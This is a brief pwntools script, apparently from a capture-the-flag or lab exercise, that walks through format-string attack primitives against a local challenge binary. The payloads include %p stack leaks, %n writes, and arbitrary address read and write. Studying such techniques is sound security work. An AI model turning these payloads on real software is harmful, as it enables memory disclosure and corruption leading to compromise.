from re import S
from pwn import *
# context.log_level='debug'
def atk(s):
    p.send(s.ljust(0xff))
    
p = process("./chal")
if(0): # dump the memory
    atk("%p|%p|%p|%p|%p|%p")
if(0): # dump rsp[idx]
    atk("%40$p")
if(0): # write to an addr
    atk("%1c%40$n")
if(0): 
    # It's significant to notice that 
    # our payload could also be on the stack
    pay = b"%16$p"
    pay = pay.ljust(0x40,b'\0')
    pay+= p64(0xdeadbeef)
    atk(pay)
if(0): # arbitrary address read
    pay = b"%16$s"
    pay = pay.ljust(0x40,b'\0')
    pay+= p64(0x7fffffffdcb0)
    atk(pay)
if(0): # arbitrary address write
    pay = b"%c%16$hn"
    pay = pay.ljust(0x40,b'\0')
    pay+= p64(0x7fffffffdcb0)
    atk(pay)
if(1): #  aaw + aar
    pay = b"%65c%16$hn"
    pay = pay.ljust(0x40,b'\0')
    pay+= p64(0x7fffffffdcb0)
    atk(pay)
    pay = b"%16$s"
    pay = pay.ljust(0x40,b'\0')
    pay+= p64(0x7fffffffdcb0)
    atk(pay)
p.interactive()